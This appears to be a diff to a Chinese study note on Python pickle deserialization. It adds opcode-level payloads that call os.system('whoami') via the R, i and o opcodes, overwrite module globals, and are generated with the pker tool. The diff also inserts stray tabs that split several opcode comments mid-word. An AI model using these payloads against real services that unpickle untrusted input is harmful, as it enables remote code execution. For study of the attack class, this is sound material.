@@ -64,32 +64,32 @@ BININT2        = b'M'   # push 2-byte unsigned int
 NONE           = b'N'   # 栈中压入 None
 PERSID         = b'P'   # push persistent object; id is taken from string arg
 BINPERSID      = b'Q'   # push persistent object; id is taken from stack
-REDUCE         = b'R'   # 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈
+REDUCE         = b'R'   # 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调							用该函数并把结果压回栈
 STRING         = b'S'   # 实例化一个字符串对象
 BINSTRING      = b'T'   # push string; counted binary string argument
 SHORT_BINSTRING= b'U'   # push string; counted binary string argument < 256 bytes
 UNICODE        = b'V'   # 实例化一个 UNICODE 字符串对象
 BINUNICODE     = b'X'   # push Unicode string; counted UTF-8 string argument
 APPEND         = b'a'   # 将栈的第一个元素 append 到第二个元素（必须为列表）中
-BUILD          = b'b'   # 使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性设置，调用 __setstate__ 或 __dict__.update()
-GLOBAL         = b'c'   # 获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压入栈
-DICT           = b'd'   # 寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-value 对），弹出组合，弹出 MARK，压回结果
+BUILD          = b'b'   # 使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进							 行属性设置，调用 __setstate__ 或 __dict__.update()
+GLOBAL         = b'c'   # 获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压						  入栈
+DICT           = b'd'   # 寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-						  value 对），弹出组合，弹出 MARK，压回结果
 EMPTY_DICT     = b'}'   # 向栈中直接压入一个空字典
-APPENDS        = b'e'   # 寻找栈中的上一个 MARK，组合之间的数据并 extends 到该 MARK 之前的一个元素（必须为列表）中
+APPENDS        = b'e'   # 寻找栈中的上一个 MARK，组合之间的数据并 extends 到该 MARK 之前的一个元素（必							须为列表）中
 GET            = b'g'   # 将 memo[n] 的压入栈
 BINGET         = b'h'   # push item from memo on stack; index is 1-byte arg
-INST           = b'i'   # 相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）
+INST           = b'i'   # 相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 							  MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）
 LONG_BINGET    = b'j'   # push item from memo on stack; index is 4-byte arg
 LIST           = b'l'   # 从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为列表
 EMPTY_LIST     = b']'   # 向栈中直接压入一个空列表
-OBJ            = b'o'   # 从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 MARK，压回结果，
+OBJ            = b'o'   # 从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 									  callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 							  MARK，压回结果，
 PUT            = b'p'   # 将栈顶对象储存至 memo[n]
 BINPUT         = b'q'   # store stack top in memo; index is 1-byte arg
 LONG_BINPUT    = b'r'   # store stack top in memo; index is 4-byte arg
-SETITEM        = b's'   # 将栈的第一个对象作为 value，第二个对象作为 key，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为 key）中
+SETITEM        = b's'   # 将栈的第一个对象作为 value，第二个对象作为 key，添加或更新到栈的第三个对象（必							须为列表或字典，列表以数字作为 key）中
 TUPLE          = b't'   # 寻找栈中的上一个 MARK，并组合之间的数据为元组，弹出组合，弹出 MARK，压回结果
 EMPTY_TUPLE    = b')'   # 向栈中直接压入一个空元组
-SETITEMS       = b'u'   # 寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中
+SETITEMS       = b'u'   # 寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）						  并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中
 BINFLOAT       = b'G'   # push float; arg is 8-byte float encoding
 
 TRUE           = b'I01\n'  # not an opcode; see INT docs in pickletools.py
@@ -616,7 +616,7 @@ class Point:
   # def __getnewargs__(self):
       # return (self.x, self.y)
 
-    def __new__(cls, x, y):
+    def __new__(cls, args):
         print("__new()__  ->  " + repr(args))
         return super().__new__(cls)
 
@@ -1007,3 +1007,278 @@ except:
 再看源码，如果 `state` 是两个元素的元组，那么会执行 `state, slotstate = state`，如果此时 `state in [None, {}]`（由于 `_pickle` 逻辑问题，是没办法让 state 等于 `''`、`0` 等这种值的），那么就会跑去执行 `setattr(inst, k, v)`，这是 mappingproxy 类型允许的
 
 所以，假如有一个库是 A，里面有个类 b，要修改 b 的属性，原本要执行的 `cA\nb\n}Va\nI1\nsb.` 应该改为 `cA\nb\n(N}Va\nI1\ntsb.` 或者 `cA\nb\n(}}Va\nI1\ntsb.`
+
+>#### 拼接opcode
+>
+>将第一个pickle流结尾表示结束的 `.` 去掉，将第二个pickle流与第一个拼接起来即可。
+>
+>#### 全局变量覆盖
+>
+>python源码：
+>
+>```
+># secret.py
+>name='TEST3213qkfsmfo'
+># main.py
+>import pickle
+>import secret
+>
+>opcode='''c__main__
+>secret
+>(S'name'
+>S'1'
+>db.'''
+>
+>print('before:',secret.name)
+>
+>output=pickle.loads(opcode.encode())
+>
+>print('output:',output)
+>print('after:',secret.name)
+>```
+>
+>首先，通过 `c` 获取全局变量 `secret` ，然后建立一个字典，并使用 `b` 对secret进行属性设置，使用到的payload：
+>
+>```
+>opcode='''c__main__
+>secret
+>(S'name'
+>S'1'
+>db.'''
+>```
+>
+>#### 函数执行
+>
+>与函数执行相关的opcode有三个： `R` 、 `i` 、 `o` ，所以我们可以从三个方向进行构造：
+>
+>1. `R` ：
+>
+>```
+>b'''cos
+>system
+>(S'whoami'
+>tR.'''
+>```
+>
+>1. `i` ：
+>
+>```
+>b'''(S'whoami'
+>ios
+>system
+>.'''
+>```
+>
+>1. `o` ：
+>
+>```
+>b'''(cos
+>system
+>S'whoami'
+>o.'''
+>```
+>
+>#### 实例化对象
+>
+>实例化对象是一种特殊的函数执行，这里简单的使用 `R` 构造一下，其他方式类似：
+>
+>```
+>class Student:
+>    def __init__(self, name, age):
+>        self.name = name
+>        self.age = age
+>
+>data=b'''c__main__
+>Student
+>(S'XiaoMing'
+>S"20"
+>tR.'''
+>
+>a=pickle.loads(data)
+>print(a.name,a.age)
+>```
+>
+>#### pker的使用（推荐）
+>
+>- pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在https://github.com/eddieivan01/pker下载源码。解析器的原理见作者的paper：[通过AST来构造Pickle opcode](https://xz.aliyun.com/t/7012)。
+>- 使用pker，我们可以更方便地编写pickle opcode，pker的使用方法将在下文中详细介绍。需要注意的是，建议在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。
+>
+>#### 注意事项
+>
+>pickle序列化的结果与操作系统有关，使用windows构建的payload可能不能在linux上运行。比如：
+>
+>```
+># linux(注意posix):
+>b'cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
+>
+># windows(注意nt):
+>b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
+>```
+>
+>### pker能做的事
+>
+>引用自https://xz.aliyun.com/t/7012#toc-5：
+>
+>> - 变量赋值：存到memo中，保存memo下标和变量名即可
+>> - 函数调用
+>> - 类型字面量构造
+>> - list和dict成员修改
+>> - 对象成员变量修改
+>
+>具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。
+>
+>### 使用方法与示例
+>
+>1. pker中的针对pickle的特殊语法需要重点掌握（后文给出示例）
+>2. 此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。
+>3. pker主要用到`GLOBAL、INST、OBJ`三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：
+>
+>```
+>以下module都可以是包含`.`的子module
+>调用函数时，注意传入的参数类型要和示例一致
+>对应的opcode会被生成，但并不与pker代码相互等价
+>
+>GLOBAL
+>对应opcode：b'c'
+>获取module下的一个全局对象（没有import的也可以，比如下面的os）：
+>GLOBAL('os', 'system')
+>输入：module,instance(callable、module都是instance)  
+>
+>INST
+>对应opcode：b'i'
+>建立并入栈一个对象（可以执行一个函数）：
+>INST('os', 'system', 'ls')  
+>输入：module,callable,para 
+>
+>OBJ
+>对应opcode：b'o'
+>建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：
+>OBJ(GLOBAL('os', 'system'), 'ls') 
+>输入：callable,para
+>
+>xxx(xx,...)
+>对应opcode：b'R'
+>使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）
+>
+>li[0]=321
+>或
+>globals_dic['local_var']='hello'
+>对应opcode：b's'
+>更新列表或字典的某项的值
+>
+>xx.attr=123
+>对应opcode：b'b'
+>对xx对象进行属性设置
+>
+>return
+>对应opcode：b'0'
+>出栈（作为pickle.loads函数的返回值）：
+>return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）
+>```
+>
+>注意：
+>
+>1. 由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为**左值**，需要索引时只能先获取相应的函数（如`getattr`、`dict.get`）才能进行。但是因为存在`s`、`u`、`b`操作符，**作为右值是可以的**。即“查值不行，赋值可以”。
+>2. pker解析`S`时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:
+>
+>```
+>test="123"
+>return test
+>```
+>
+>被解析为：
+>
+>```
+>b"S'123'\np0\n0g0\n."
+>```
+>
+>#### pker：全局变量覆盖
+>
+>- 覆盖直接由执行文件引入的`secret`模块中的`name`与`category`变量：
+>
+>```
+>secret=GLOBAL('__main__', 'secret') 
+># python的执行文件被解析为__main__对象，secret在该对象从属下
+>secret.name='1'
+>secret.category='2'
+>```
+>
+>- 覆盖引入模块的变量：
+>
+>```
+>game = GLOBAL('guess_game', 'game')
+>game.curr_ticket = '123'
+>```
+>
+>接下来会给出一些具体的基本操作的实例。
+>
+>#### pker：函数执行
+>
+>- 通过`b'R'`调用：
+>
+>```
+>s='whoami'
+>system = GLOBAL('os', 'system')
+>system(s) # `b'R'`调用
+>return
+>```
+>
+>- 通过`b'i'`调用：
+>
+>```
+>INST('os', 'system', 'whoami')
+>```
+>
+>- 通过`b'c'`与`b'o'`调用：
+>
+>```
+>OBJ(GLOBAL('os', 'system'), 'whoami')
+>```
+>
+>- 多参数调用函数
+>
+>```
+>INST('[module]', '[callable]'[, par0,par1...])
+>OBJ(GLOBAL('[module]', '[callable]')[, par0,par1...])
+>```
+>
+>#### pker：实例化对象
+>
+>- 实例化对象是一种特殊的函数执行
+>
+>```
+>animal = INST('__main__', 'Animal','1','2')
+>return animal
+>
+>
+># 或者
+>
+>animal = OBJ(GLOBAL('__main__', 'Animal'), '1','2')
+>return animal
+>```
+>
+>- 其中，python原文件中包含：
+>
+>```
+>class Animal:
+>
+>    def __init__(self, name, category):
+>        self.name = name
+>        self.category = category
+>```
+>
+>- 也可以先实例化再赋值：
+>
+>```
+>animal = INST('__main__', 'Animal')
+>animal.name='1'
+>animal.category='2'
+>return animal
+>```
+>
+>#### 手动辅助
+>
+>- 拼接opcode：将第一个pickle流结尾表示结束的`.`去掉，两者拼接起来即可。
+>- 建立普通的类时，可以先pickle.dumps，再拼接至payload。
+>
+>#### [Macr0phag3/souse: A tool for converting Python source code to opcode(pickle) (github.com)](https://github.com/Macr0phag3/souse)
